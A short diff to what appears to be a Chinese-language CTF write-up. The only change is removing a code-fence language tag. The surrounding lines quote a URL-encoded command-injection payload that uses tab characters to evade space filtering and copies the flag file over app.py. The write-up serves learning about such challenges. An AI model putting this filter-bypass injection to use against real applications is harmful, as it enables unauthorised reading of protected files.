@@ -427,7 +427,7 @@ if __name__ == '__main__': app.run(host='0.0.0.0', debug=False, port=8080)
 后面也发现了确实不行。。。
 一位师傅给出的payload
 
-```ABAP
+```
 cp%09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy
 
 解码后
